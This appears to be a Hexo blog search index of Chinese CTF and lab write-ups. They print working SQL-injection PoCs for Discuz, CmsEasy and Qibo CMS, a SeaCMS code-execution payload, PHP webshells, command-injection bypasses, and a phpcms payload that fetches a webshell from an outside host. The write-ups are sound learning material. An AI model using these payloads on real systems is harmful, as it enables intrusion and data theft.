<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[第四届全国网络空间安全技术大赛wp]]></title>
    <url>%2F2018%2F05%2F13%2F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[一、WEBwelcome签到题就不说了。 1.Web1进入题目，就提示我们login，然后跳转到登陆页面。看到有个注册，第一直觉让我随便来注册一个账号。然后用这个账号登陆。 看到说flag在flag.php里，于是来访问一下flag.php,它提示only admin can get the flag，然后重新跳转到登陆页面。刚才好像登陆进去时有个修改密码，马上想到会不会是任意密码重置漏洞.于是再次登陆.按修改密码，同时按F12查看此时的cookie, 那个cookie里username参数的值base64解码后正好是我们所注册的用户名hahahahaha,所以想着把admin进行base64放进去能不能就以admin登陆。于是试了一下，把cookie改好，然后在这个修改密码的页面修改一下密码，比如123456789。提示修改成功，然后跳转回登陆框，于是我们现在来试试以admin为用户名，密码为123456789来登陆,果然进去了.跳转到一个manage.php。 想着既然都admin登陆了，就直接访问flag.php嘛，但是居然还是提醒只有admin才行，并又跳转回去。问了小组师傅才知道，从这里就可以知道如果不以服务器主人的身份访问都会被跳转。想到要以服务器主人的身份访问，就想到了ssrf漏洞。这个是这道题比较脑洞的地方。毕竟给个框框还有上传的，很容易往xss或upload上想。重新看了一遍ssrf的博文之后，就知道这题就只要在远程图片地址上http://127.0.0.1/flag.php即可。这里坑的是，写上之后，它变成了一个jpg文件，然后给出了路径，访问那个路径变成这样 确实是一张图片，但是好像没有什么内容诶。后来有个师傅提醒….把这个图片保存到本地然后用记事本打开就得到了flag了……. flag{dbf6e52d69973dd16d87d4a8c3816ca9} 2.web2这题进去之后是个登陆框，但是tm可气的是，这个登陆框居然….居然是假了。想了很久没思路。。。后来一个师傅甩给我一个扫目录结构的工具(dirsearch)，用了才知道好神奇（手动惊讶！）。于是用这个工具扫一梭子 前面那一大堆/.git/让我一下子想起了前一段做题时下载的GitHack工具，就是把git文件还原。这里面还有有upload.php。于是工具再走一波，得到了好多源码. 最好奇的其实就是那个upload.php了，因为刚才访问它的时候显示了个who are you，然后也和web1一样跳转到那个登陆框.但是这次那个登陆框是虚的，于是想到了用cookie。点击查看它的源码 12345678910111213141516171819202122232425262728293031323334&lt;?php function Administrator($value)&#123; if(empty($_COOKIE['in_adminid']) || empty($_COOKIE['in_adminexpire']) || $_COOKIE['in_adminexpire']!==md5($_COOKIE['in_adminid'].$_COOKIE['in_adminname'].$_COOKIE['in_adminpassword'].$_COOKIE['in_permission']))&#123; return False; &#125; setcookie("in_adminexpire",$_COOKIE['in_adminexpire'],time()+1800); if(!empty($_COOKIE['in_permission']))&#123; $array=explode(",",$_COOKIE['in_permission']); $adminlogined=false; for($i=0;$i&lt;count($array);$i++)&#123; if($array[$i]==$value)&#123;$adminlogined=true;&#125; &#125; if(!$adminlogined)&#123; return False; &#125; &#125;else&#123; return False; &#125; return true; &#125; if (Administrator(2))&#123; if(isset($_FILES['file']))&#123; $filename = './img/img'.rand().'.jpg'; move_uploaded_file($_FILES["file"]["tmp_name"],$filename); header('Refresh:3,url=index.php?file=upload.php'); echo "Upload $filename Success!"; die; &#125; &#125;else&#123; header('Refresh:3,url=index.php?file=login.html'); echo "Who are you!"; die; &#125;?&gt; 我们发现让我们能够进入upload.php的是上半部分代码。这段代码通过 cookie 验证登录用户信息，将 “in_adminid”,”in_adminname”,”in_adminpassword”,”in_permission” 拼接在一起 MD5 后与 “in_adminexpire” 的值比较，左右两值相等就通过验证，再通过 “in_permision” 验证该用户是否有本页面权限。因为 cookie 我们是可控的所以我们很容易绕过它的验证方式。于是构造cookie如下： 然后再访问upload.php，发现就进去了. 这里有关上传框，我们再来看一下upload.php下半部分的代码。你传入任何文件都会给你输出jpg文件。这里我们可以做一个实验。新建一个txt文件，里面写上php代码。如 1&lt;?php echo "hello" ?&gt; 然后上传上去，得到一个以jpg文件结尾的路径.然后用index.php的文件包含这个文件。结果如下: 说明我们上传上去的txt文件输入在上传后变成了jpg文件，但是在index.php里被看作php文件来处理。所以echo出来hello。于是我们写入一个一句话木马.上传上去，同样的操作，然后用菜刀连接就可以getshell了. 看到了fl4g.php,原来以为就这样结束了，结果打开是乱码，下载下来还是乱码。 本来以为题目被人破坏了，后来小组师傅告诉我，让我去搜前面那几个单词的字符串。才知道，原来这是一种加密形式。叫做php_screw .在github里找到解密脚本。里面还需要解密还需要找到服务器端php_screw.so来查看PM9SCREW,PM9SCREW_LEN和pm9screw_mycryptkey的值。在菜刀里没找到这个文件，后来又是小组师傅的提醒，在php.ini文件里有这个文件的路径.于是，php.ini嘛，就要得到phpinfo，根据刚才说的，上传上去的txt被index.php当成php执行了。所以上传一个写有 1&lt;?php phpinfo(); ?&gt; 的txt文件，上传上去，得到路径，然后访问就得到了phpinfo 于是尝试直接访问php.ini，结果失败了。所以又用刚才的思路，写一个txt文件 刚开始用的是include包含，结果不行。后来用file_get_Content，就可以了。 在这里我们知道了php_screw.so文件的路径，于是直接访问. 还是一堆乱码，后来知道这是bin文件，浏览器不能正常显示。于是保存下来，按教程里用ida打开来找那三个值。 发现没找到。问了师傅和加上百度之后知道了，我们刚才那个fl4g.php开头那个PM9SCREW之所以显示的原因就是因为这三个值没有修改，是默认的。于是，打开我的Ubuntu，按照里面的教程，一步步的，flag就出来了。 这里有个坑点就是：在sudo ./decode path时那个path一定要是完整的路径。我本来把待解密的php文件放到同一目录，所以就直接sudo ./decode fl4g.php，结果显示段错误。解决了一晚上加一早上都没解决….后来有个师傅找到了这个问题的解决方法。（好像说mac就不用写完整的路径）。 二、miscmisc1看到图片，马上右击保存下来。用记事本打开无果。试试改后缀名为zip，果然是一个压缩包.里面有个加密的txt文件。因为没有告诉我们密码有几位，强行爆破应该不可能。而且里面只有一个文件，明文攻击也不可能。于是就剩下伪加密了。用winhex打开,因为刚做过iscc里面一道题，所以很容易就找到了 把那个01改成00即可。保存，之后发现txt就没有加密了。点开txt文件 这个很明显是base64，但是总不能一个个的解密，然后拼在一起好像也不对。后来才知道这是base64隐写。 在百度里找到解码脚本。运行即可。 还是太菜，只会这几题了…….]]></content>
  </entry>
  <entry>
    <title><![CDATA[mozhe 靶场做题记录]]></title>
    <url>%2F2018%2F05%2F08%2Fmozhe-%E9%9D%B6%E5%9C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[最近发现了一个不错的靶场，那个是最近出来的。里面的漏洞靶场对我来说可以涨挺多知识的。而且可能刚开始，里面的靶场很多都是免费的。做的听舒服的。也推荐一一下下：（https://www.mozhe.cn/） 一、命令执行1.titile:PHP代码分析溯源(第4题)背景介绍： 小明收到一个网址，打开后是一串加密的代码。小明需要你们的帮助，感受到时代在召唤了吗？ 实训目标： 1.了解命令执行的基础知识;2.学习php代码的相关知识;3.了解加密解密的相关知识; 进入题目，发现页面里有一串php代码。 1234&lt;?phpeval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));?&gt; 明显这个不符合php语法格式。所以我们把eval改成ehco再处理一下变成 1234&lt;?php echo gzinflate(base64_decode(&quot;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&quot;));?&gt; 然后在本地运行，得到： 1echo `$_REQUEST[a]`;; ?&gt; 于是我们就可以用命令执行漏洞了。用?a=ls来查看所有目录文件。 然后用?a=cat key_273223101616493.php就可以得到了flag–&gt;mozheca51564b14585838f9d323ac4e1 注意：这里flag被注释掉了，查看源码即可。 2.title:命令注入执行分析背景介绍: 某单位IT运维人员为了方便，在服务器上留了一个页面，用来ping内部服务器连通情况。安全工程师”墨者”在做月度检查时发现了这一文件，检查发现这一文件存在漏洞，要求运维人员立刻下线。 实训目标: 1、掌握Linux系统的基本命令；2、了解Linux中管道符的作用； 进去之后是一个让我们输入ip的输入框，明显是一个ping ip的操作。这个在最近的iscc里也有类似的题。然后用burp抓个包 本来想像iscc那样用127.0.0.1%0als来列出所有文件名。可是并没有执行。 于是去看了几篇命令执行漏洞的博文，例如（https://blog.csdn.net/qq_27446553/article/details/73927518） 试了&amp;，&amp;&amp;都不行，最后用了管道符|就可以了，||也可以。那么我们就ls 然后cat的时候发现空格被过滤。按照博文里的方法,我用了&lt;和$IFS$9 符号，${IFS}` 符号都可以绕过。 —&gt;通道符|: command 1|command 2 把command1的输出做为command2的输入。command1的不会显示在屏幕上.注意：1、管道命令只处理前一个命令正确输出，不处理错误输出2、管道命令右边命令，必须能够接收标准输入流命令才行。 例如： 1ps –ef |grep python Ps是linux中非常强大的进程查看工具，其中-e为显示所有进程，-f为全格式显示。 Grep是一个非常高效的查询工具，可以查询文本中带有某关键字的行。 这个命令的功能是，查询带有关键字 python 的进程。会一条一条列出。 1234567&amp; 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &apos;1‘ &amp;&amp; echo &apos;2&apos; | 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &apos;yes&apos; | wc -l|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot; 1$&#123;IFS&#125;,$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 二、SQL注入1.title: SQL注入实战(防注入)-Access背景介绍： 一套SQL通用asp防注入脚本 实训目标： 1、了解sql注入的基本原理。2、了解一句话木马的使用。3、了解一句话的加密使用。4、了解基本的信息收集。 进入这个题目，它说记录好像写到数据库文件里面了，于是我们可以尝试写入一句话木马来getshell.有个id参数，我们加上单引号,弹窗： 随后我们发现我们的1‘被写入到数据库中了 于是我们尝试直接写入一句话木马，发现提交数据为空，说明有被过滤。于是我们进行编码一下，就提交成功了， 1http://219.153.49.228:47667/news.asp?id=%3C%25eval%20request%28%22ccccc%22%29%25%3E 然后通过搜索引擎找到该记录文件为目录下的sqlin.asp。用菜刀连接即可。 坑点：这里得用IE浏览器，我用了火狐和chorme都不行，即使传进去了，但是浏览器自动给你Unicode编码，造成一句马被编码了，菜刀无法连接。后来用了ie就可以。 2.title:X-Forwarded-For注入漏洞实战背景介绍: 某业务系统，安全工程师”墨者”进行授权黑盒测试，系统的业主单位也没有给账号密码，怎么测？ 实训目标： 1、掌握SQL注入的基本原理；2、了解服务器获取客户端IP的方式；3、了解SQL注入的工具使用； 这题让我又学会了一种sqlmap的用法. 进入题目，是一个登陆框。我们先用admin，admin登陆，然后发现 发现这里记录了我电脑的ip。那么就可以想到这里的注入点是XFF。看了一篇关于http头注入的文章。然后用burp抓包，添加一个XFF，在ip后加个“”号，作用是sqlmqp会自动查找注入点，插入“”可引导sqlmap。然后把请求copy下来保存为一个txt文件 然后就开启我们的神器sqlmap，输入命令sqlmap.py -r “C:\Users\XXX\Desktop\request.txt” -p “X-Forwarded-For” –dbs 就可以爆库。 然后以此类推就可以爆出表名，字段，数据了。进而就可以知道账号密码了.]]></content>
  </entry>
  <entry>
    <title><![CDATA[discuz7.2 faq.php注入漏洞]]></title>
    <url>%2F2018%2F04%2F30%2Fdiscuz7-2-faq-php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[这个是好久之前爆出了漏洞，早就修复了。这里就是昨天做百度杯的一道cms题-，就是上一篇博文里的“再见cms”的漏洞时发现的和这个漏洞相似，就写下来记录一下. 在faq.php里找到action=grouppermission的代码 1234567891011121314151617&#125; elseif($action == &apos;grouppermission&apos;) &#123; ksort($gids); $groupids = array(); foreach($gids as $row) &#123; $groupids[] = $row[0]; &#125; $query = $db-&gt;query(&quot;SELECT * FROM &#123;$tablepre&#125;usergroups u LEFT JOIN &#123;$tablepre&#125;admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&quot;.implodeids($groupids).&quot;)&quot;); 可以知道，定义了一个groupids的数组。然后遍历gids，其也为一个数组。然后把gids数组第一个所有值取出来赋给groupids里。然后discuz在全局会对GET数组进行addslashes转义，也就是说会将’转义成\’，所以，如果我们的传入的参数是：gids[1]=’的话，会被转义成$gids[1]=\’，而这个赋值语句$groupids[] = $row[0]就相当于取了字符串的第一个字符，也就是\，把转义符号取出来了。 然后把groupids经过implodeids函数处理放到sql语句里。implodeids函数代码如下： 1234567function implodeids($array) &#123; if(!empty($array)) &#123; return &quot;&apos;&quot;.implode(&quot;&apos;,&apos;&quot;, is_array($array) ? $array : array($array)).&quot;&apos;&quot;; &#125; else &#123; return &apos;&apos;; &#125;&#125; 其中implode()函数返回由数组元素组合成的字符串。上面就是每个数组元素用’,’隔开。这样子，数组经过implodeids函数处理后返回类似于’1’,’2’,’3’,’4’的字符串。我们的数组刚取出来一个转义符，它会将这里一个正常的’转义掉，比如这样：’1’,’\’,’3’,’4’。把第四个的单引号转义，导致3后面的单引号逃逸，从而导致了注入。 poc：1http://xxx.com/faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)# //检查漏洞存在 12http://www.xxx.com/faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 //爆用户名密码]]></content>
  </entry>
  <entry>
    <title><![CDATA[cms系列]]></title>
    <url>%2F2018%2F04%2F30%2Fcms%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[一、bugku web进阶—–CMS1.phpcms按照cms漏洞题的套路，去Google一波phpcms exp,发现了好多关于phpcms漏洞的报告。任意点开一个 1https://www.cnblogs.com/sqyysec/p/6725870.html 按照博文里在本地所复现的漏洞，首先点击注册，然后填写信息后抓包， 然后把POC添加进去（这里我引用的一句话木马是网上一个人云盘上的） 1siteid=1&amp;modelid=10&amp;username=hsakdhsakdsh&amp;password=123456&amp;pwdconfirm=123456&amp;email=sdskdksa%40qq.com&amp;info[content]=&lt;img src=http://ovgb1c2jq.bkt.clouddn.com/1.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= EEC$NL.png) 然后用菜刀连上即可，注入参数为GETF得到flag。 当然这个也可以在火狐里用hackbar操作： 坑点：1.那个modelid的值一定要是11，如果是当时注册的10的话，就不会成功。 ​ 2.每次username和email都要改动。 ​ 2.seacms同样，在google里找poc： 123searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=var_dump(scandir(&apos;/web&apos;));也可以用searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r(scandir(getcwd()));//&#123;if:1&#125;&#123;end if&#125; 发现了flag32#.txt so 1searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=show_source(&quot;flag32#.txt&quot;) file_input_content(\’drac.php\’,\’&lt;?php eval($_POST[hack]);?&gt;\’) 百度杯1.YeserCMS通过指纹识别，发现这个网站真正的是cmseasy，百度一下cmseasy的漏洞。发现有一堆。通过尝试，最终确定了这题是cmseasy CmsEasy_5.6_20151009 无限制报错注入 poc：123/celive/live/header.phpxajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%27%2C%28UpdateXML%281%2CCONCAT%280x5b%2Cmid%28%28SELECT%2f%2a%2a%2fGROUP_CONCAT%28concat%28username%2C%27%7C%27%2Cpassword%29%29%20from%20yesercms_user%29%2C1%2C32%29%2C0x5d%29%2C1%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29--%20&lt;/q&gt;&lt;/xjxquery&gt; 爆出来用户名和密码（MD5加密的）解密得Yeser231。登陆后台后，看了wp，才知道在当前模板编辑处存在文件读取漏洞。 2.再见CMS同样用指纹识别，知道这个网站是齐博CMS。通过对搜来的poc的尝试，可以知道这题是齐博cms_userinfo注入。这个漏洞原理和discuz7.2的faq.php那个注入类似。某变量$str全局做过转义，导致%00转义成了\0.我们能够控制str_replace的前两个参数，则str_replace(‘0’, ‘’, $str)，再将0转换成空，则留下了\，这个\可以转义其后的\’，使之变成\’，导致单引号逃逸出转义符的限制，造成注入。执行的语句类似update table set a=’111’,b=’222’ where uid=1，我们引入一个\在111的最后，转义掉111后面的引号，这样222就逃逸出了限制，我们的sql注入语句就可以放在222的位置执行了。 https://blog.csdn.net/qq_33020901/article/details/52593063 于是按照大佬的博文。先注册一个账号。然后进入我的博客，记住url地址里的uid的值 我这里是3.下一步，就把网上的poc带进去。先测试一下： 12345/member/userinfo.php?job=edit&amp;step=2post：old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=171171@qq.com&amp;provinceid=//这里%0000被转义成\000,然后000被替换为空 这里配一个博文里面在本地搭的一个测试结果： 1234/member/userinfo.php?job=edit&amp;step=2post：old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=171171@qq.com&amp;provinceid=,address=(select user()) where uid=3%23 然后查看个人信息 接下来就好办了，但是之前一直在尝试解管理员密码，后面想到了用load_file读flag.php ,这里需要16进制。又题目说flag.php在网站根目录。 于是 1234/member/userinfo.php?job=edit&amp;step=2post：old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=171171@qq.com&amp;provinceid=,address=(load_file(0x7661722f7777772f68746d6c2f666c61672e706870) where uid=3%23 得到flag。 未完待续…….]]></content>
  </entry>
  <entry>
    <title><![CDATA[nctf-sql inject汇总]]></title>
    <url>%2F2018%2F04%2F16%2Fnctf-sql-inject%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[1.SQL Injectionhttp://chinalover.sinaapp.com/web15/index.php 进入题目，只有一个Invalid password!。习惯性的查看源码，得到： 12345678910111213141516171819202122232425262728293031323334#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;//magic_quotes_gpc()开启时为获得的字符中的单引号等字符进行转义，get_magic_quotes_gpc()为检查magic_quotes_gpc()是否开启stripslashes函数为字符串中删除由addslashes函数添加的反斜杠htmlentities()函数： htmlentities() 函数把字符转换为 HTML 实体htmlentities($str, ENT_COMPAT); 只转换双引号htmlentities($str, ENT_QUOTES); 转换双引号和单引号htmlentities($str, ENT_NOQUOTES); 不转换任何引号 可以知道，这里username要为admin，然后password这里可以用万能密码绕过。这里对字符串也使用了htmlentities函数处理，过滤了单引号。根据题目的提示我们可以用反斜杠来转义一个单引号，从而让其闭合。我们让username的value为admin\，password为or 1=1#,把这个带到sql语句中： 1SELECT * FROM users WHERE name=\&apos;&apos;admin\&apos;\&apos; AND pass=\&apos;&apos;or 1=1#&apos;\&apos;; 这里就变成了SELECT * FROM users WHERE name=’admin\’ AND pass=’ or 1=1#’; 这里name的值变为admin AND pass=,为false，加上or 1=1就为ture了。 这样子flag就出来了。 ​ 注：在mysql查询语句中转义字符不参与闭合 也就是说第二个单引号和第六个单引号闭合。 2.SQL注入1http://chinalover.sinaapp.com/index.phps 题目一进去就可以点source查看源码，明显是一个代码审计的题。 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 这里就是post一个user一个pass，然后把pass进行md5加密。然后执行sql语句，然后把结果集赋给变量query。echo flag 的条件就是结果集里user的value为admin即可。那么这个和pass无关。我们可以构造把pass注释掉。 即user的值为admin’)#,然后pass随便填即可得到flag 3.SQL注入2http://4.chinalover.sinaapp.com/web6/index.php 这题也是代码审计的，查看源码： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 这题和上一题不同的是这里echo flag的条件是让我们输入的password和数据库里的pass对比，相同就echo flag。那这个就无法用注释符来处理。题目的tip说union查询。我们要使满足条件，可以尝试修改sql的值，使select pw…..语句失效，然后执行我们后面的payload。所以构造user的值为1’ and 0=1 union select md5(1)# 即替换后sql语句变成了 1select pw from ctf where user=&apos;1&apos;and 0=1 union select md5(1)#&apos; 前面的‘1’ and 0=1使得前面那一些语句失效。sql的值就等于md5(1).于是我们pass也输入1即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[nctf-综合题2 wp]]></title>
    <url>%2F2018%2F04%2F15%2Fnctf-%E7%BB%BC%E5%90%88%E9%A2%982%2F</url>
    <content type="text"><![CDATA[【综合题2】 http://cms.nuptzj.cn 进入题目，发现是个留言板。下面有留言框，于是试试xss，结果写完xss语句点击预览时，根据提示，这题不是xss的题目。因为题目说是个综合题，肯定要后台getshell的，然后getshell的方法最容易想到的就是sql得到后台账号密码，然后用一句话木马加菜刀。于是接下来开始对这个网站收集信息。 ​ 按从上到下的顺序，映入眼帘的是那个留言搜索，于是随便输一个数，点搜索。界面显示，要也他们的浏览器才行，说明这个要改UA。然后这个搜索的页面是so.php，post的变量为soid，明显这个是等会的注入点。 既然不知道要把UA改成什么，于是，进行其他的收集。那个留言框可以排除掉了，毕竟题目自己都说这个是个摆设。 于是，就剩下下面那个本CMS说明了。在这里面，我们可以发现，这里是一个文件包含。而且也可以得知有一个叫admin的表，表里有username和userpass字段。而且也列出了config.php,index.php,passencode.php,say.php.前2个是配置文件，没什么用。用文件包含读取第三个。得到源码： 123456789101112131415&lt;?phpfunction passencode($content)&#123;//$pass=urlencode($content);$array=str_split($content);$pass=&quot;&quot;;for($i=0;$i&lt;count($array);$i++)&#123;if($pass!=&quot;&quot;)&#123;$pass=$pass.&quot; &quot;.(string)ord($array[$i]);&#125;else&#123;$pass=(string)ord($array[$i]);&#125;&#125;return $pass;&#125;?&gt; 这个意思大概就是把密码进行了ascii码加密。 say.php里没发现什么。然后我们再来读取一下刚才的搜索页面的so.php，得到源码： 1234567891011121314151617181920&lt;?phpif($_SERVER[&apos;HTTP_USER_AGENT&apos;]!=&quot;Xlcteam Browser&quot;)&#123;echo &apos;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&apos;; exit();&#125;$id=$_POST[&apos;soid&apos;];include &apos;config.php&apos;;include &apos;antiinject.php&apos;;include &apos;antixss.php&apos;;$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);$rs=mysql_fetch_array($result);echo htmlspecialchars($rs[&apos;nice&apos;]).&apos;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;.antixss($rs[&apos;say&apos;]).&apos;&lt;br /&gt;&apos;;mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 这里可以知道UA应该为Xlcteam Browser。而且这里又知道了几个文件，antiinject.php和antixss.php，因为xss没用了，所以我们读取antiinject.php。得到源码： 12345678910&lt;?phpfunction antiinject($content)&#123;$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&apos; &apos;,&quot;&apos;&quot;,&quot;;&quot;,&apos;&quot;&apos;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], &apos;&apos;,$info);&#125;return $info;&#125;?&gt; 这里我们可以知道，它把sql注入的关键字替换成了空。这个可以用双写来绕过。空格可以用/**/绕过。 然后回到刚才那个搜索界面，知道了UA，用火狐的插件Modify headers，add一个UA，值为Xlcteam Browser。 然后我们既然知道了表名和列名，于是直接构造sql语句： 12345soid=-1/**/ununionion/**/seleselectct/**/1,group_concat(usernanameme),3,4/**/frfromom/**/adadminmin#//得到用户名为adminsoid=-1/**/ununionion/**/seleselectct/**/1,group_concat(userpapassss),3,4/**/frfromom/**/adadminmin#得到 102 117 99 107 114 117 110 116 117。//根据前面那个passencode.php知道，这里是ascii码，于是密码就是fuckruntu。 现在就开始找后台登陆界面了。我们好像剩下一个那个cms说明的本身有关about.php还没有读取。于是读取得 12345678910111213141516&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php$file=$_GET[&apos;file&apos;];if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;echo &quot;file参数不能为空！&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;&#125;&#125; 于是知道有个叫loginxlcteam的文件，用包含读取不了，于是直接访问，得到了登陆界面。 于是登陆进入后台。 诶，这里都不用我们上传一句话木马了。由于不知道连接密码。后来才知道有个叫php回调后门 https://blog.csdn.net/settoken/article/details/50946689 读取xlcteam.php得 12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 这个对应了博文里的第四种情况。 于是构建http://cms.nuptzj.cn/xlcteam.php?www=preg_replace，密码就是wtf。用菜刀连接即可。 —–&gt;flag:nctf{you_are_s0_g00d_hacker}]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F02%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
